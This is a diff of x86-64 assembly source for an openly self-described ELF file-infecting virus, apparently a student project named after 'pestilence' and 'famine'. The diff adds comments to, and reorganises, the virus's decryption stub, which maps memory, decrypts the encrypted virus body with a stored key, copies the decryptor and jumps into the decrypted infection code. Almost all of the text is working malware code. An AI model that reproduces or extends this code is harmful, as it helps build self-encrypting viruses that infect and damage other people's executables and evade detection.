@@ -63,6 +63,30 @@ _start:
 	cmp		QWORD [rax], 0
 	je		_famine_start_options
 
+; IMPORTANT: this is how an encryped binary looks like (It didn't concern the pestilence base binary):
+; -----------
+; text section
+;
+; entry_of_virus: <- THIS PART IS UNENCRYPTED FROM:
+;	_o_entry
+;	TO
+;	_encrypted_part_start
+;
+; virus: <- THIS PART IS ENCRYPTED FROM:
+; 	_encrypted_part_start
+;	TO
+; 	_final_end + 2
+;
+; key
+; depacker 
+; padding for page size
+;
+; rest of the file
+
+; Dont forget that the decrypted part is on an MMAP. That's why we need to copy the entire file,
+; to use the relative addr of the functions, like _o_entry and _string.
+
+; Mmap, for the decrypted virus
 	mov rax, 9
 	mov rdi, 0
 	mov rsi, 8192
@@ -75,55 +99,76 @@ _start:
 	jle _force_exit
 	mov QWORD [rsp], rax
 
-;	take encrypted part size
-	lea rax, [rel _encrypted_part_start]
-	lea rdx, [rel _final_end]
-	add rdx, 2
-	sub rdx, rax
-	lea r10, [rel _o_entry]
-	sub rax, r10
-	mov r11, rax
+; Take encrypted part size
+	lea rax, [rel _encrypted_part_start] ; take start addr
+	lea rdx, [rel _final_end] ; take end addr
+	add rdx, 2 ; add 2 for the leave/ret
+	sub rdx, rax ; substract 
+
+; Take first non-encrypted part size (_o_entry to _encrypted_part)
+	lea r10, [rel _o_entry] ; take start addr
+	sub rax, r10 ; sub with the end addr
+	mov r11, rax ; store it on r11
 	mov r10, rax
-	add r10, rdx
+	add r10, rdx ; add encrypted part size, so we have the total virus size
 
-;	sub rsp, r10
-	mov rdi, QWORD [rsp]
-	lea rsi, [rel _o_entry]
-	mov rcx, r11
+; Copy the non-encrypted part on our mmap
+	mov rdi, QWORD [rsp] ; take mmap addr
+	lea rsi, [rel _o_entry] ; take our addr
+	mov rcx, r11 ; we will copy just the unencrypted part
 	cld
-	rep movsb
+	rep movsb ; copy
 
-	lea rax, [rel _final_end]
-	add rax, 2
+; We will call decrypt but:
+; We will decrypt ONLY encrypted code. So it didn't include the pestilence binary.
+; Pestilence binary have a padding between _final_end and _decrypt,
+; but when we infect others binaries, we copy _decrypt directly after _final_end + key_size, without
+; any padding. So we need to recalculate the _decrypt addr: it's _final_end + 2 (the size of leave/ret instructions) + 256 (key_size)
+; We don't have any conditions to check if their is a padding, because pestilence base code isn't
+; encrypted, Only, infect binaries have the infection code encrypted.
+	lea rax, [rel _final_end] ; take _final_end addr
+	add rax, 2 ; add 2, to go on key addr
+; Set parameters
 	mov rdi, rax ; first parameter is the key
-	lea rsi, [rel _encrypted_part_start]
-	mov r10, QWORD [rsp]
-	add r10, r11
-	add rax, 256
-	call rax
+	lea rsi, [rel _encrypted_part_start] ; second parameter is the zone to decrypt
+	; rdx is the zone size, calculated before.
+; r10 is our addr where we store the decrypted code, it's:
+; mmap_base_addr + unencrypted_copy_size
+	mov r10, QWORD [rsp] ; take mmap base addr
+	add r10, r11 ; take unencrypted_part_size
+	add rax, 256 ; now we add 256 to our key addr, to go on _decrypt
+	call rax ; and we call _decrypt
 
-	mov rdi, QWORD [rsp]
+; Now we move our decrypter on our mmap directly after decrypted part + 256 (key_size)
+	mov rdi, QWORD [rsp] ; take mmap addr
+; Go to _decrypt
 	lea rsi, [rel _final_end]
 	add rsi, 2
 	add rsi, 256
+; Calculate virus + key total size
 	lea rcx, [rel _o_entry]
 	mov r10, rsi
 	sub r10, rcx
+; Go to our decrypt on mmap
 	add rdi, r10
+; Calculate decrypt size
 	lea rcx, [rel _end_decrypt]
 	add rcx, 2
 	lea r10, [rel _decrypt]
 	sub rcx, r10
+; Move it on mmap
 	cld
 	rep movsb
 
-	lea r10, [rel _o_entry]
-	lea r11, [rel _encrypted_part_start]
-	sub r11, r10
-;	push _o_entry
-	mov rdi, QWORD [rsp]
-	add rdi, r11
-	jmp rdi
+; Now, we have our decrypted part on our mmap, we need to call it, so:
+; We take our unencrypted part size, and add it to our mmap_base_addr to go to our
+; desencrypted part, and we jump in.
+	lea r10, [rel _o_entry] ; take _o_entry_addr 
+	lea r11, [rel _encrypted_part_start] ; take _encrypted_part_addr
+	sub r11, r10 ; take our unencrypted part size
+	mov rdi, QWORD [rsp] ; take mmap_addr
+	add rdi, r11 ; add our offset to mmap_addr
+	jmp rdi ; jmp in
 
 _encrypted_part_start:
 	;; --------------------------------------------------------------------------------------------
